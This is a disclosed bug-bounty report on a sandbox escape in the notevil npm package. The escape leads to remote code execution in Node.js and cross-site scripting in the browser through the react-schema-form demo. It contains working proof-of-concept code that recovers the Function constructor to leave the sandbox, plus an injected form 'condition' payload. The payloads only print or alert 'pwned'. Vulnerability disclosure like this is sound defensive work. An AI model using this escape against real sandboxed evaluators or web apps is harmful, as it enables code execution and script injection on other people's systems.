# [notevil] - Sandbox Escape Lead to RCE on Node.js and XSS in the Browser

## Report Details
- **Report ID**: 809012
- **URL**: https://hackerone.com/reports/809012
- **State**: Closed
- **Severity**: high
- **Submitted**: 2020-03-03T00:07:44.820Z
- **Disclosed**: 2020-08-27T16:14:50.822Z

## Reporter
- **Username**: phra
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
I would like to report a sandbox escape / code injection vulnerability in notevil.

It allows an attacker to escape the intended sandbox and execute javascript code in the global context, meaning that he/she can achieve arbitrary command execution (RCE) when running in nodejs and cross site scripting (XSS) when running in the browser.

# Module

**module name:** notevail
**version:** 1.3.2
**npm page:** `https://www.npmjs.com/package/notevil`

## Module Description

Evalulate javascript like the built-in javascript eval() method but safely.

This module uses esprima to parse the javascript AST then walks each node and evaluates the result.

Like built-in eval, the result of the last expression will be returned. Unlike built-in, there is no access to global objects, only the context that is passed in as the second object.

Built in types such as Object and String are still available, but they are wrapped so that any changes to prototypes are contained in the eval instance.

## Module Stats

[1] weekly downloads: 3,290

# Vulnerability

## Vulnerability Description

A bypass to a previous sandbox escape fix (https://github.com/mmckegg/notevil/commit/5974329712f0a527c5e16d3b9067a076e28e45f1) is existing and proven by the attached poc.

## Steps To Reproduce:

### Node.js

```
var safeEval = require("notevil")

var code = "" +
    "function fn() {};" +
    "var constructorProperty = Object.getOwnPropertyDescriptors(fn.__proto__).constructor;" +
    "var properties = Object.values(constructorProperty);" +
    "properties.pop();" +
    "properties.pop();" +
    "properties.pop();" +
    "var Func = properties.map(function (x) {return x.bind(x, 'return this.process.mainModule.constructor._load(`util`).log(`pwned`)')}).pop();" +
    "(Func())()"
console.log(safeEval(code))
```

check the provided poc:
- http://runkit.com/phra/notevil---sandbox-escape

### Browser

If we check some dependent package, such as react-schema-form, we can see that the issue lead to XSS when the affected package is used in the browser.

1. visit https://networknt.github.io/react-schema-form/
2. set form
```
[
  {
    "key": "comments",
    "condition": "function fn() {};var constructorProperty = Object.getOwnPropertyDescriptors(fn.__proto__).constructor;var properties = Object.values(constructorProperty);properties.pop();properties.pop();properties.pop();var Func = properties.map(function (x) {return x.bind(x, 'return this.alert(`pwned `)')}).pop();(Func())()",
    "type": "radios",
    "titleMap": [
      {
        "value": "S",
        "name": "Shipping"
      },
      {
        "value": "P",
        "name": "Pickup"
      }
    ]
  }
]
```
3. set schema
```
{
  "type": "object",
  "required": [
    "comments"
  ]
}
```

## Patch

*TBD*

## Supporting Material/References:

not applicable.

# Wrap up

- I contacted the maintainer to let them know: N 
- I opened an issue in the related repository: N

## Impact

An attacker can execute arbitrary commands on the system when the package is used with nodejs and execute arbitrary javascript when is used in the browser.

## Attachments
- react-schema-form.png
- notevil.png
